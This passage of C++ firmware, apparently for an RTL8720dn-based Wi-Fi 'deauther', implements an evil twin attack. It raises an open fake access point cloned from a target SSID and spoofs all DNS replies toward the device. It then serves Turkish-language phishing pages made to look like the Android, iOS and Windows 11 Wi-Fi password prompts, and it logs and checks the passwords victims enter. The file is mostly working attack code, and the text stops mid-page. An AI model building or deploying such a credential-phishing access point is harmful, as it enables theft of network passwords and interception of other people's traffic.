#include "evil_twin.h"
#include "wifi_cust_tx.h"
#include "wifi_conf.h"
#include "wifi_structures.h"
#include "wifi_util.h"
#include "WiFi.h"
#include "WiFiClient.h"
#include "WiFiUdp.h"

// ─── Dışarıdan tanımlı değişkenler (RTL8720dn-Deauther.ino) ──────────────────
extern char *ssid;
extern char *pass;

// ─── Dışa açılan değişkenler ─────────────────────────────────────────────────
bool       evil_twin_active    = false;
String     evil_twin_ssid      = "";
int        evil_twin_channel   = 1;
uint8_t    evil_twin_bssid[6]  = {0};
int        evil_twin_clients   = 0;
bool       evil_twin_dual_band = false;
uint8_t    evil_twin_bssid2[6] = {0};
int        evil_twin_channel2  = 0;
String     evil_twin_ssid2     = "";
bool       et_last_verify_ok   = false;
String     et_last_verify_pass = "";
ETPassword et_passwords[ET_MAX_PASSWORDS];
int        et_password_count   = 0;

// ─── İç değişkenler ──────────────────────────────────────────────────────────
static WiFiUDP       et_dns_udp;
static bool          et_dns_started    = false;
static unsigned long et_last_deauth_ms = 0;
static unsigned long et_last_retrack_ms= 0;
static uint8_t       et_broadcast[6]   = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// Retrack tarama sonucu
static volatile bool    et_rt_found   = false;
static volatile uint8_t et_rt_channel = 0;
static uint8_t          et_rt_bssid[6] = {0};

// ─── AP başlatma sarmalayıcısı ────────────────────────────────────────────────
//
// ARAŞTIRMA BULGUSU — Evil-BW16-WebUI, Ameba IoT forum, BW16-ESP32-Evil-Twin:
//
// AmebaD SDK'sı, WiFi.apbegin() öncesi STA arayüzünün TAMAMEN kapatılmasını
// zorunlu kılar. WiFi.disableSTA() çağrılmadan apbegin() çağrılırsa:
//   - AP sessizce başarısız olur VEYA başlar ama beacon göndermez
//   - Kurbanın tarama listesinde ağ görünmez
//   - Bu, "deauth çalışıyor ama sahte AP görünmüyor" hatasının #1 sebebidir.
//
// Referanslar:
//   - Evil-BW16-WebUI (Evil-Project-Team/Evil-BW16-WebUI) startEvilTwin()
//   - Ameba IoT forum: "WiFi.disableSTA() before apbegin()"
//   - BW16-ESP32-Evil-Twin (Janek79ax) setup sequence
//
// Kanal:  AmebaD SDK imzası: WiFi.apbegin(ssid, password, channel_str)
//         channel_str bir char* string — bu doğru; uint8_t değil.
// Şifre:  Boş string ("") → AmebaD iç tarafında ENC_TYPE_NONE → açık ağ.
static void et_ap_start(const String &ap_ssid, int channel) {
  char s[64];
  char c[4];
  strncpy(s, ap_ssid.c_str(), sizeof(s) - 1);
  s[sizeof(s) - 1] = '\0';

  // Kanal 1–13 arası; dışarıdaki değerleri 6'ya sabitle
  int ch = channel;
  if (ch < 1 || ch > 13) ch = 6;
  snprintf(c, sizeof(c), "%d", ch);

  // ── ADIM 1: STA arayüzünü tamamen kapat ──────────────────────────────────
  // Bu olmadan apbegin() beacon göndermez.
  WiFi.disconnect();
  WiFi.disableSTA();
  delay(300); // Radio settle — atlamak AP'nin başlamamasına yol açar

  // ── ADIM 2: Sahte AP'yi başlat (açık ağ, şifresiz) ───────────────────────
  WiFi.apbegin(s, (char *)"", c);
}

// ─── DNS Spoofer ──────────────────────────────────────────────────────────────
// Tüm DNS sorgularına 192.168.1.1 (ET_AP_IP_STR) cevabı döner.
// TTL=60: istemciler cevabı 60 sn önbelleğe alır → tekrarlı sorgu azalır.
//
// Güvenlik: DNS yanıt tamponu 512 bayt.
// Sorgu 490 baytı aşarsa yanıt eklentisi tampon dışına taşabilir.
// Bu sebeple n > 490 ise paket sessizce yok sayılır.
static uint8_t et_dns_buf[512];

static void et_dns_process_packet() {
  int n = et_dns_udp.parsePacket();
  if (n < 12 || n > 490) return;  // Çok küçük/büyük → atla

  IPAddress sender_ip   = et_dns_udp.remoteIP();
  uint16_t  sender_port = et_dns_udp.remotePort();
  n = et_dns_udp.read(et_dns_buf, sizeof(et_dns_buf));
  if (n < 12 || n > 490) return;

  // Yalnızca standart sorgu (QR=0, opcode=0) kabul et
  if ((et_dns_buf[2] & 0x80) != 0) return;  // Yanıt paketi → atla
  if ((et_dns_buf[2] & 0x78) != 0) return;  // Standart olmayan opcode → atla

  uint8_t resp[512];
  memcpy(resp, et_dns_buf, n);

  // DNS yanıt bayrakları: QR=1, AA=1, RA=1 (authoritative, recursive available)
  resp[2] = 0x84;  // 1000 0100 — QR|AA
  resp[3] = 0x80;  // 1000 0000 — RA

  // ANCOUNT=1, NSCOUNT=0, ARCOUNT=0
  resp[6]  = 0x00; resp[7]  = 0x01;
  resp[8]  = 0x00; resp[9]  = 0x00;
  resp[10] = 0x00; resp[11] = 0x00;

  // Yanıt kaydı: name pointer → soru adına (0xC00C)
  int pos = n;
  resp[pos++] = 0xC0; resp[pos++] = 0x0C;  // Name pointer
  resp[pos++] = 0x00; resp[pos++] = 0x01;  // Type: A
  resp[pos++] = 0x00; resp[pos++] = 0x01;  // Class: IN
  // TTL = 60 saniye (0x0000003C)
  resp[pos++] = 0x00; resp[pos++] = 0x00;
  resp[pos++] = 0x00; resp[pos++] = 0x3C;
  resp[pos++] = 0x00; resp[pos++] = 0x04;  // RDLENGTH = 4
  // RDATA: 192.168.1.1
  resp[pos++] = 192; resp[pos++] = 168;
  resp[pos++] = 1;   resp[pos++] = 1;

  et_dns_udp.beginPacket(sender_ip, sender_port);
  et_dns_udp.write(resp, pos);
  et_dns_udp.endPacket();
}

// ─── User-Agent tespiti ───────────────────────────────────────────────────────
static String et_get_ua(const String &request) {
  int p = request.indexOf("User-Agent:");
  if (p < 0) p = request.indexOf("user-agent:");
  if (p < 0) return "";
  int e = request.indexOf("\r\n", p);
  if (e < 0) return request.substring(p + 11);
  return request.substring(p + 11, e);
}

// ─── HTTP yanıt gönder ────────────────────────────────────────────────────────
static void et_send_html(WiFiClient &client, const String &html) {
  String hdr;
  hdr.reserve(120);
  hdr  = "HTTP/1.1 200 OK\r\n";
  hdr += "Content-Type: text/html; charset=UTF-8\r\n";
  hdr += "Content-Length: ";
  hdr += String(html.length());
  hdr += "\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n";
  client.write(hdr.c_str());
  client.write(html.c_str());
}

static void et_send_redirect(WiFiClient &client, const char *url) {
  String r;
  r.reserve(120);
  r  = "HTTP/1.1 302 Found\r\nLocation: ";
  r += url;
  r += "\r\nContent-Length: 0\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n";
  client.write(r.c_str());
}

// Android için 204 No Content yanıtı (captive portal algılama bazı sürümlerde
// bu yanıtı bekler; yanlış yanıt → portal açılmaz)
static void et_send_204(WiFiClient &client) {
  client.write("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
}

// ═══════════════════════════════════════════════════════════════════════════════
// PORTAL SAYFALARI
// ═══════════════════════════════════════════════════════════════════════════════

// ─── Android — Material Design 3 ─────────────────────────────────────────────
static void portal_android(WiFiClient &client, bool wrong_pass) {
  String html;
  html.reserve(6000);
  html = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'>"
    "<title>");
  html += evil_twin_ssid;
  html += F("</title><style>"
    ":root{"
      "--bg:#1C1B1F;--surf:#2B2930;--surf2:#38343C;"
      "--on-bg:#E6E1E5;--on-surf:#E6E1E5;"
      "--outline:#938F99;--outline-var:rgba(147,143,153,.35);"
      "--primary:#D0BCFF;--on-pri:#381E72;"
      "--hint:#938F99;--err:#F2B8B8;--err-bg:rgba(242,184,184,.12)"
    "}"
    "@media(prefers-color-scheme:light){"
      ":root{"
        "--bg:#FFFBFE;--surf:#F4EFF4;--surf2:#ECE6F0;"
        "--on-bg:#1C1B1F;--on-surf:#1C1B1F;"
        "--outline:#79747E;--outline-var:rgba(121,116,126,.3);"
        "--primary:#6750A4;--on-pri:#FFFFFF;"
        "--hint:#49454F;--err:#B3261E;--err-bg:rgba(179,38,30,.08)"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
    "body{font-family:'Google Sans',Roboto,'Noto Sans',sans-serif;"
      "background:var(--bg);color:var(--on-bg);min-height:100vh;padding:0 20px 32px}"
    ".back-row{padding:12px 0 0;margin-bottom:20px}"
    ".back{width:40px;height:40px;display:flex;align-items:center;justify-content:center;"
      "border-radius:50%;border:none;background:var(--surf2);color:var(--on-bg);cursor:pointer;padding:0}"
    "h1{font-size:28px;font-weight:400;color:var(--on-bg);margin-bottom:32px;"
      "line-height:1.2;word-break:break-all;letter-spacing:-.3px}"
    ".field{position:relative;margin-bottom:4px}"
    ".finput{width:100%;height:56px;background:var(--surf);"
      "border:none;border-bottom:1px solid var(--outline);"
      "border-radius:4px 4px 0 0;padding:20px 48px 6px 16px;"
      "font-size:16px;color:var(--on-bg);outline:none;"
      "-webkit-appearance:none;appearance:none;font-family:inherit}"
    ".finput:focus{border-bottom:2px solid var(--primary)}"
    ".flabel{position:absolute;left:16px;top:50%;transform:translateY(-50%);"
      "font-size:16px;color:var(--hint);pointer-events:none;transition:all .15s ease}"
    ".finput:focus~.flabel,.finput:not(:placeholder-shown)~.flabel{"
      "top:14px;transform:none;font-size:12px;color:var(--primary)}"
    ".finput:not(:focus)~.flabel{color:var(--outline)}"
    ".eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);"
      "background:none;border:none;cursor:pointer;color:var(--outline);padding:6px;line-height:0}"
    ".hint-txt{font-size:12px;color:var(--hint);margin:4px 0 28px 16px}"
    ".err-txt{font-size:12px;color:var(--err);margin:4px 0 28px 16px;"
      "background:var(--err-bg);padding:8px 12px;border-radius:4px}"
    ".wps-hint{background:var(--surf);border-radius:12px;margin-top:20px;"
      "padding:14px 16px;display:flex;gap:10px;align-items:flex-start}"
    ".wps-badge{background:#1565C0;color:#fff;font-size:10px;font-weight:700;"
      "padding:3px 7px;border-radius:4px;flex-shrink:0;margin-top:1px;letter-spacing:.3px}"
    ".wps-txt{font-size:13px;color:var(--hint);line-height:1.5}"
    ".btns{display:flex;justify-content:flex-end;gap:10px}"
    ".bcancel{height:40px;padding:0 24px;border-radius:20px;"
      "border:1px solid var(--outline);background:transparent;"
      "color:var(--on-bg);font-size:14px;font-family:inherit;cursor:pointer}"
    ".bconnect{height:40px;padding:0 24px;border-radius:20px;"
      "border:none;background:var(--primary);color:var(--on-pri);"
      "font-size:14px;font-family:inherit;font-weight:500;cursor:pointer}"
    "</style></head><body>"
    "<div class='back-row'>"
    "<button class='back' onclick='history.back()'>"
      "<svg width='24' height='24' viewBox='0 0 24 24' fill='currentColor'>"
        "<path d='M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z'/>"
      "</svg>"
    "</button></div>"
    "<h1>");
  html += evil_twin_ssid;
  html += F("</h1>"
    "<p style='font-size:13px;color:var(--hint);text-align:center;margin:0 0 14px'>"
      "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
    "</p>"
    "<form method='post' action='/portal/submit' id='f'>"
    "<div class='field'>"
      "<input class='finput' type='password' name='password' id='pw'"
        " placeholder=' ' autocomplete='off'>"
      "<label class='flabel' for='pw'>&#350;ifre*</label>"
      "<button type='button' class='eye' onclick='togglePw()'>"
        "<svg width='22' height='22' viewBox='0 0 24 24' fill='currentColor'>"
          "<path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5"
          "s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5"
          "s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3"
          " 3-1.34 3-3-1.34-3-3-3z'/>"
        "</svg>"
      "</button>"
    "</div>");
  if (wrong_pass) {
    html += F("<div class='err-txt'>Yanl&#305;&#351; &#351;ifre, l&#252;tfen tekrar deneyin.</div>");
  } else {
    html += F("<p class='hint-txt'>*zorunlu</p>");
  }
  html += F(
    "<div class='btns'>"
      "<button type='button' class='bcancel' onclick='history.back()'>&#304;ptal</button>"
      "<button type='submit' class='bconnect'>Ba&#287;lan</button>"
    "</div>"
    "</form>"
    "<div class='wps-hint'>"
      "<span class='wps-badge'>WPS</span>"
      "<div style='flex:1'>"
        "<div style='font-size:13px;font-weight:600;margin-bottom:4px;color:var(--on-bg)'>"
          "&#350;ifresiz ba&#287;lan"
        "</div>"
        "<div class='wps-txt'>"
          "<b>&#350;ifreyi bilmiyorsan&#305;z</b> modemin arkas&#305;ndaki "
          "<b>WPS</b> tu&#351;una <b>3&ndash;5 saniye</b> basarak "
          "&#351;ifresiz ba&#287;lanabilirsiniz. Ba&#287;lant&#305; otomatik kurulacakt&#305;r."
        "</div>"
      "</div>"
    "</div>"
    "<script>"
      "function togglePw(){"
        "var p=document.getElementById('pw');"
        "p.type=p.type==='password'?'text':'password'"
      "}"
    "</script>"
    "</body></html>");
  et_send_html(client, html);
}

// ─── iOS — Apple native WiFi parola ekranı ────────────────────────────────────
static void portal_ios(WiFiClient &client, bool wrong_pass) {
  String html;
  html.reserve(6000);
  html = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
    "<title>Parolay&#305; Gir</title><style>"
    ":root{"
      "--bg:#F2F2F7;--cell:#FFFFFF;--text:#000000;--text2:rgba(60,60,67,.6);"
      "--sep:rgba(60,60,67,.29);--tint:#007AFF;--ph:rgba(60,60,67,.3);"
      "--err:#FF3B30;--nav-bg:rgba(242,242,247,.85)"
    "}"
    "@media(prefers-color-scheme:dark){"
      ":root{"
        "--bg:#000000;--cell:#1C1C1E;--text:#FFFFFF;--text2:rgba(235,235,245,.6);"
        "--sep:rgba(84,84,88,.65);--tint:#0A84FF;--ph:rgba(235,235,245,.3);"
        "--err:#FF453A;--nav-bg:rgba(28,28,30,.85)"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
    "body{font-family:-apple-system,'SF Pro Text','Helvetica Neue',sans-serif;"
      "background:var(--bg);color:var(--text);min-height:100vh}"
    ".nav{display:flex;align-items:center;justify-content:space-between;"
      "padding:14px 16px 10px;backdrop-filter:blur(20px);"
      "-webkit-backdrop-filter:blur(20px);background:var(--nav-bg);"
      "border-bottom:.5px solid var(--sep)}"
    ".nav-cancel{color:var(--tint);font-size:17px;border:none;background:none;"
      "cursor:pointer;padding:4px 0;font-family:inherit;letter-spacing:-.2px}"
    ".nav-title{font-size:17px;font-weight:600;letter-spacing:-.4px}"
    ".nav-join{color:var(--tint);font-size:17px;font-weight:600;border:none;"
      "background:none;cursor:pointer;padding:4px 0;font-family:inherit}"
    ".nav-join:disabled{opacity:.35}"
    ".content{padding:28px 16px 0}"
    ".wifi-ico{font-size:58px;text-align:center;margin-bottom:14px;line-height:1}"
    ".ssid-lbl{font-size:22px;font-weight:600;text-align:center;margin-bottom:8px;"
      "word-break:break-all;letter-spacing:-.5px}"
    ".sub{font-size:13px;color:var(--text2);text-align:center;margin-bottom:24px;"
      "line-height:1.55;padding:0 8px}"
    ".err-box{background:var(--cell);border-radius:10px;padding:12px 16px;"
      "margin-bottom:14px;font-size:13px;color:var(--err);text-align:left;"
      "display:flex;gap:8px;align-items:flex-start}"
    ".cell-group{background:var(--cell);border-radius:12px;overflow:hidden;margin-bottom:8px}"
    ".cell{display:flex;align-items:center;min-height:44px;padding:0 16px}"
    ".cell+.cell{border-top:.5px solid var(--sep)}"
    ".cell-lbl{font-size:17px;min-width:90px;flex-shrink:0;letter-spacing:-.2px}"
    ".cell-input{flex:1;border:none;background:transparent;font-size:17px;"
      "color:var(--text);outline:none;padding:10px 8px;-webkit-appearance:none;"
      "font-family:inherit;letter-spacing:-.2px}"
    ".cell-input::placeholder{color:var(--ph)}"
    ".eye-ios{background:none;border:none;color:var(--text2);cursor:pointer;"
      "padding:4px 0 4px 10px;display:flex;align-items:center}"
    ".wps-hint{background:var(--cell);border-radius:12px;padding:14px 16px;"
      "margin-top:16px;display:flex;gap:10px;align-items:flex-start}"
    ".wps-badge{background:#1565C0;color:#fff;font-size:10px;font-weight:700;"
      "padding:3px 7px;border-radius:4px;flex-shrink:0;margin-top:1px;letter-spacing:.3px}"
    ".wps-txt{font-size:13px;color:var(--text2);line-height:1.5}"
    "@media(prefers-color-scheme:dark){.wps-hint{border:.5px solid var(--sep)}}"
    "</style></head><body>"
    "<div class='nav'>"
      "<button class='nav-cancel' onclick='history.back()'>&#304;ptal</button>"
      "<span class='nav-title'>Parolay&#305; Gir</span>"
      "<button class='nav-join' form='f' type='submit' id='joinbtn' disabled>Kat&#305;l</button>"
    "</div>"
    "<div class='content'>"
      "<div class='wifi-ico'>&#128225;</div>"
      "<div class='ssid-lbl'>");
  html += evil_twin_ssid;
  html += F("</div>"
      "<div class='sub'>"
        "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
        "<br><span style='font-size:11px;opacity:.7'>"
          "&ldquo;Wi-Fi Key&rdquo; &bull; &ldquo;WPA Key&rdquo; &bull; &ldquo;Password&rdquo;"
        "</span>"
      "</div>");
  if (wrong_pass) {
    html += F("<div class='err-box'>"
      "<span>&#9888;&#65039;</span>"
      "<span>Yanl&#305;&#351; parola. L&#252;tfen tekrar deneyin.</span>"
    "</div>");
  }
  html += F("<p style='font-size:13px;color:var(--text2);text-align:center;margin:0 0 14px 0;padding:0 16px'>"
      "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
    "</p>"
    "<form id='f' method='post' action='/portal/submit'>"
      "<div class='cell-group'>"
        "<div class='cell'>"
          "<span class='cell-lbl'>Parola</span>"
          "<input class='cell-input' type='password' name='password' id='pw'"
            " placeholder='Gerekli' autocomplete='off'"
            " oninput='document.getElementById(\"joinbtn\").disabled=this.value.length<1'>"
          "<button type='button' class='eye-ios' onclick='togglePw()'>"
            "<svg width='22' height='16' viewBox='0 0 24 18' fill='currentColor'>"
              "<path d='M12 3C7 3 2.73 6.11 1 10c1.73 3.89 6 7 11 7s9.27-3.11 11-7"
              "c-1.73-3.89-6-7-11-7zm0 11.5c-2.49 0-4.5-2.01-4.5-4.5S9.51 5.5 12 5.5"
              "s4.5 2.01 4.5 4.5-2.01 4.5-4.5 4.5zm0-7.2c-1.49 0-2.7 1.21-2.7 2.7"
              "s1.21 2.7 2.7 2.7 2.7-1.21 2.7-2.7-1.21-2.7-2.7-2.7z'/>"
            "</svg>"
          "</button>"
        "</div>"
      "</div>"
    "</form>"
    "<div class='wps-hint'>"
      "<span class='wps-badge'>WPS</span>"
      "<div style='flex:1'>"
        "<div style='font-size:13px;font-weight:600;margin-bottom:4px'>&#350;ifresiz ba&#287;lan</div>"
        "<div class='wps-txt' style='margin-bottom:7px'>"
          "<b>&#350;ifreyi bilmiyorsan&#305;z</b> modemin arkas&#305;ndaki "
          "<b>WPS</b> tu&#351;una <b>3&ndash;5 saniye</b> basarak "
          "&#351;ifresiz ba&#287;lanabilirsiniz. Ba&#287;lant&#305; otomatik kurulacakt&#305;r."
        "</div>"
      "</div>"
    "</div>"
    "</div>"
    "<script>"
      "function togglePw(){"
        "var p=document.getElementById('pw');"
        "p.type=p.type==='password'?'text':'password'"
      "}"
    "</script>"
    "</body></html>");
  et_send_html(client, html);
}

// ─── Windows 11 WiFi flyout ───────────────────────────────────────────────────
static void portal_windows(WiFiClient &client, bool wrong_pass) {
  String html;
  html.reserve(7000);
  html = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Ba&#287;lan: ");
  html += evil_twin_ssid;
  html += F("</title><style>"
    ":root{"
      "--bg:#F3F3F3;--card:#FFFFFF;--text:#1A1A1A;--text2:#5D5D5D;"
      "--border:#E0E0E0;--sep:#EBEBEB;"
      "--input-bg:#FAFAFA;--input-border:#ABABAB;"
      "--accent:#0078D4;--accent-h:#006CBE;--accent-txt:#FFFFFF;"
      "--cancel-bg:#F0F0F0;--cancel-h:#E8E8E8;--cancel-txt:#1A1A1A;--cancel-bd:#D0D0D0;"
      "--shadow:0 8px 32px rgba(0,0,0,.14),0 2px 8px rgba(0,0,0,.08);"
      "--err:#C42B1C;--err-bg:#FDE7E9;--err-bd:#F1BCBC;"
      "--wps-bg:#EBF4FF;--wps-bd:#B3D4F5;--wps-txt:#0063B1"
    "}"
    "@media(prefers-color-scheme:dark){"
      ":root{"
        "--bg:#1A1A1A;--card:#2C2C2C;--text:#FFFFFF;--text2:#ABABAB;"
        "--border:#3C3C3C;--sep:#404040;"
        "--input-bg:#383838;--input-border:#5A5A5A;"
        "--accent:#60CDFF;--accent-h:#4FC3F7;--accent-txt:#1A1A1A;"
        "--cancel-bg:#383838;--cancel-h:#424242;--cancel-txt:#FFFFFF;--cancel-bd:#505050;"
        "--shadow:0 8px 32px rgba(0,0,0,.5),0 2px 8px rgba(0,0,0,.3);"
        "--err:#FF9494;--err-bg:#3D1A1A;--err-bd:#7A3030;"
        "--wps-bg:#0D2235;--wps-bd:#1F4A72;--wps-txt:#60CDFF"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:'Segoe UI Variable','Segoe UI Variable Text','Segoe UI',system-ui,sans-serif;"
      "background:var(--bg);min-height:100vh;"
      "display:flex;align-items:center;justify-content:center;padding:24px}"
    ".card{background:var(--card);border:1px solid var(--border);"
      "border-radius:8px;width:100%;max-width:380px;box-shadow:var(--shadow)}"
    ".hdr{padding:20px 24px 16px;border-bottom:1px solid var(--sep)}"
    ".hdr-top{display:flex;align-items:center;gap:12px;margin-bottom:4px}"
    ".wifi-ico{width:36px;height:36px;background:var(--accent);border-radius:50%;"
      "display:flex;align-items:center;justify-content:center;"
      "color:var(--accent-txt);font-size:18px;flex-shrink:0}"
    ".ssid-txt{font-size:14px;font-weight:600;word-break:break-all;line-height:1.3}"
    ".ssid-sub{font-size:12px;color:var(--text2);margin-top:3px}"
    ".body{padding:18px 24px 20px}"
    ".info-txt{font-size:13px;color:var(--text2);margin-bottom:16px;line-height:1.5}"
    ".err-box{background:var(--err-bg);border:1px solid var(--err-bd);border-radius:4px;"
      "padding:9px 12px;margin-bottom:14px;"
      "font-size:12px;color:var(--err);display:flex;gap:7px;align-items:center}"
    ".field-lbl{font-size:12px;color:var(--text2);margin-bottom:5px;display:block;font-weight:400}"
    ".field-wrap{position:relative;margin-bottom:6px}"
    ".field-input{width:100%;height:30px;background:var(--input-bg);"
      "border:1px solid var(--input-border);border-radius:3px;"
      "padding:0 34px 0 10px;font-size:13px;color:var(--text);"
      "font-family:inherit;outline:none;transition:border-color .15s,box-shadow .15s}"
    ".field-input:focus{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)}"
    ".eye-btn{position:absolute;right:6px;top:50%;transform:translateY(-50%);"
      "background:none;border:none;cursor:pointer;color:var(--text2);"
      "padding:0;line-height:0;display:flex;align-items:center}"
    ".hint-sm{font-size:11px;color:var(--text2);margin-bottom:14px;opacity:.8}"
    ".chk-row{display:flex;align-items:center;gap:8px;margin-bottom:20px}"
    ".chk-row input{width:13px;height:13px;accent-color:var(--accent);cursor:pointer;flex-shrink:0}"
    ".chk-row label{font-size:12px;color:var(--text2);cursor:pointer}"
    ".btn-row{display:flex;justify-content:flex-end;gap:8px;padding-top:4px}"
    ".btn{height:30px;padding:0 16px;border-radius:3px;"
      "font-size:13px;font-family:inherit;cursor:pointer;font-weight:400}"
    ".btn-cancel{background:var(--cancel-bg);color:var(--cancel-txt);"
      "border:1px solid var(--cancel-bd)}"
    ".btn-cancel:hover{background:var(--cancel-h)}"
    ".btn-connect{background:var(--accent);color:var(--accent-txt);border:none;font-weight:600}"
    ".btn-connect:hover{background:var(--accent-h)}"
    ".wps-strip{background:var(--wps-bg);border:1px solid var(--wps-bd);"
      "border-radius:0 0 7px 7px;padding:11px 16px;"
      "display:flex;gap:9px;align-items:flex-start}"
    ".wps-badge{background:#0063B1;color:#fff;font-size:10px;font-weight:700;"
      "padding:2px 6px;border-radius:3px;flex-shrink:0;letter-spacing:.3px;margin-top:1px}"
    "@media(prefers-color-scheme:dark){.wps-badge{background:#60CDFF;color:#000}}"
    ".wps-info{font-size:12px;color:var(--wps-txt);line-height:1.5}"
    "</style></head><body>"
    "<div class='card'>"
    "<div class='hdr'>"
      "<div class='hdr-top'>"
        "<div class='wifi-ico'>&#128225;</div>"
        "<div>"
          "<div class='ssid-txt'>");
  html += evil_twin_ssid;
  html += F("</div>"
          "<div class='ssid-sub'>Kilitli &bull; Kablosuz A&#287; G&#252;venlik Anahtar&#305; Gerekli</div>"
        "</div>"
      "</div>"
    "</div>"
    "<div class='body'>"
      "<p class='info-txt'>"
        "Wi-Fi &#351;ifresi modemin/router&#305;n alt veya yan etiketinde yazar."
        " &ldquo;Wi-Fi Key&rdquo;, &ldquo;WPA Key&rdquo; veya &ldquo;Password&rdquo; olarak ge&#231;ebilir."
      "</p>");
  if (wrong_pass) {
    html += F("<div class='err-box'>"
        "<svg width='14' height='14' viewBox='0 0 24 24' fill='currentColor'>"
          "<path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"
          "m1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/>"
        "</svg>"
        "<span>A&#287;&#305;n g&#252;venlik anahtar&#305; yanl&#305;&#351;. Tekrar deneyin.</span>"
      "</div>");
  }
  html += F("<p style='font-size:13px;color:var(--text2);text-align:center;margin:0 0 14px 0'>"
      "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
    "</p>"
    "<form method='post' action='/portal/submit'>"
      "<label class='field-lbl' for='pw'>A&#287; G&#252;venlik Anahtar&#305;</label>"
      "<div class='field-wrap'>"
        "<input class='field-input' type='password' name='password' id='pw'"
          " placeholder='Parolay&#305; girin' autocomplete='off'>"
        "<button type='button' class='eye-btn' onclick='togglePw()'>"
          "<svg width='16' height='16' viewBox='0 0 24 24' fill='currentColor'>"
            "<path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5"
            "c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"
            "m0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z'/>"
          "</svg>"
        "</button>"
      "</div>"
      "<p class='hint-sm'>Parola en az 8 karakter olmal&#305;d&#305;r.</p>"
      "<div class='chk-row'>"
        "<input type='checkbox' id='auto' checked>"
        "<label for='auto'>Karakterleri gizle</label>"
      "</div>"
      "<div class='btn-row'>"
        "<button type='button' class='btn btn-cancel' onclick='history.back()'>&#304;ptal</button>"
        "<button type='submit' class='btn btn-connect'>&#304;leri</button>"
      "</div>"
    "</form>"
    "</div>"
    "<div class='wps-strip'>"
      "<span class='wps-badge'>WPS</span>"
      "<div style='flex:1'>"
        "<div class='wps-info'>"
          "<b>&#350;ifreyi bilmiyorsan&#305;z</b> modemin arkas&#305;ndaki "
          "<b>WPS tu&#351;una 3&ndash;5 saniye</b> basarak &#351;ifresiz ba&#287;lanabilirsiniz. "
          "Ba&#287;lant&#305; otomatik kurulacakt&#305;r."
        "</div>"
      "</div>"
    "</div>"
    "</div>"
    "<script>"
      "function togglePw(){"
        "var p=document.getElementById('pw');"
        "p.type=p.type==='password'?'text':'password'"
      "}"
    "</script>"
    "</body></html>");
  et_send_html(client, html);
}

// ─── Bağlantı başarı sayfası ──────────────────────────────────────────────────
static void portal_success(WiFiClient &client) {
  String html;
  html.reserve(2000);
  html = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Ba&#287;land&#305;</title><style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;"
      "background:#f0f2f5;color:#1a1a2e;min-height:100vh}"
    ".hdr{background:linear-gradient(90deg,#c0392b,#e74c3c);"
      "padding:14px 20px;display:flex;align-items:center;gap:12px;color:#fff}"
    ".hdr-ico{width:38px;height:38px;background:rgba(255,255,255,.2);"
      "border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px}"
    ".hdr-title{font-size:1em;font-weight:700}"
    ".wrap{max-width:400px;margin:32px auto;padding:0 16px}"
    ".card-ok{background:#fff;border-radius:16px;padding:36px 24px;text-align:center;"
      "box-shadow:0 2px 12px rgba(0,0,0,.10);border-top:5px solid #27ae60}"
    ".big-ico{font-size:64px;display:block;margin-bottom:16px}"
    "h1{color:#1e7e34;font-size:1.3em;margin-bottom:10px;font-weight:800}"
    "p{font-size:.9em;color:#555;line-height:1.65}"
    ".steps-ok{list-style:none;margin:20px 0 0;text-align:left}"
    ".steps-ok li{display:flex;align-items:center;gap:10px;padding:7px 0;"
      "border-bottom:1px solid #f0f2f5;font-size:.85em;color:#444}"
    ".steps-ok li:last-child{border-bottom:none}"
    ".ok-ico{color:#27ae60;font-size:18px;flex-shrink:0}"
    "</style></head><body>"
    "<div class='hdr'>"
      "<div class='hdr-ico'>&#128225;</div>"
      "<div><div class='hdr-title'>Ba&#287;lant&#305; Hizmetleri</div></div>"
    "</div>"
    "<div class='wrap'>"
      "<div class='card-ok'>"
        "<span class='big-ico'>&#9989;</span>"
        "<h1>Ba&#287;lant&#305;n&#305;z Yenilendi!</h1>"
        "<p>&#304;nternet ba&#287;lant&#305;n&#305;z ba&#351;ar&#305;yla do&#287;ruland&#305;."
